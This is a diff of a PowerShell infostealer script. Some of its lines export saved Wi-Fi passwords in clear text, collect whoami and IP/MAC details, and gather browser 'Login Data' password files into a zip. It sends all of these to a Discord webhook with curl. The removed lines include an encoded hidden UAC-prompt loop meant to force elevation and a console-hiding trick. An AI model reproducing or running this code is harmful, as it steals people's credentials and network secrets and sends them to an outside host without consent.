@@ -1,24 +1,22 @@
-# this is just to get uac bomb
-powershell -noni -w hidden -nop -e dwBoAGkAbABlACgALQBuAG8AdAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQA6ADoAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgApACkAewAgAHQAcgB5AHsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcAB3AHMAaAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAE4AbwBFAHgAaQB0ACAALQBDAG8AbQBtAGEAbgBkACAAJgAgACcAJAAoACQATQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4ALgBNAHkAQwBvAG0AbQBhAG4AZAAuAEQAZQBmAGkAbgBpAHQAaQBvAG4AKQAnACIAIAAtAFcAbwByAGsAaQBuAGcARABpAHIAZQBjAHQAbwByAHkAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAALQBWAGUAcgBiACAAUgB1AG4AQQBzACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwADsAIABlAHgAaQB0ACAAfQAgAGMAYQB0AGMAaAAgAHsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAxACAAfQAgAH0AOwA=
-Add-Type -Name Win -Namespace P -MemberDefinition '[DllImport("kernel32.dll")]public static extern System.IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(System.IntPtr hWnd,int nCmdShow);';$h=[P.Win]::GetConsoleWindow();[P.Win]::ShowWindow($h,2)
-# Hide cmd ^^
 
+#pip install pycryptodomex pywin32 browser-cookie3 requests
+cmd.exe /c "D: && cd D:\Scripts && py fun.py" # instead of downloading something, just use the 128 gigs on the D:\ and run it there
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
 
 #scrape the localappdata for password files
-$zip="$env:LOCALAPPDATA\Temp\LoginDataBackup.zip";$tempDir=Join-Path $env:LOCALAPPDATA "Temp\LoginDataTemp";Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue;New-Item -Path $tempDir -ItemType Directory -Force|Out-Null;Get-ChildItem $env:LOCALAPPDATA -Filter "Login Data" -Recurse -Force -ErrorAction SilentlyContinue|ForEach-Object{$p=Split-Path $_.FullName -Parent;$gp=Split-Path $p -Parent;if((Split-Path $gp -Leaf)-ieq"User Data"){$vendor=Split-Path (Split-Path $gp -Parent) -Leaf;$profile=Split-Path $p -Leaf;$label="$vendor-$profile-LoginData";Copy-Item $_.FullName (Join-Path $tempDir $label) -Force -ErrorAction SilentlyContinue}};if(Test-Path $zip){Remove-Item $zip -Force};if(Get-ChildItem $tempDir){Compress-Archive -Path (Join-Path $tempDir '*') -DestinationPath $zip -Force};Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-
-$ip_add = try{(Invoke-RestMethod "https://api.ipify.org?format=json" -ErrorAction Stop).ip}catch{""}
-
+$zip=$env:TEMP\funny_stuff_folder.zip
 $whoami_content = whoami
 
 ipconfig /all | Out-File -FilePath "$e\ipcfg.txt" # save ipconfig as a file
 
+$mac=(ipconfig /all | findstr /R "Physical")
+$ipv6=(ipconfig /all | findstr /R "IPv6")
+$ipv4=(ipconfig /all | findstr /R "IPv4")
 
 #send to discord
 
 #send http
-Start-Process curl.exe -F "content=Passwords for: $whoami_content | IP: $ip_add | @everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" $wh > $null 2>&1
+Start-Process curl.exe -F "content=Passwords for: $whoami_content | IP: $ipv4[0] | Public: $ipv4[1] | MacAddress: $mac | IPv6: $ipv6 \n@everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" $wh > $null 2>&1
 
 cls # clear console
 # cleanup
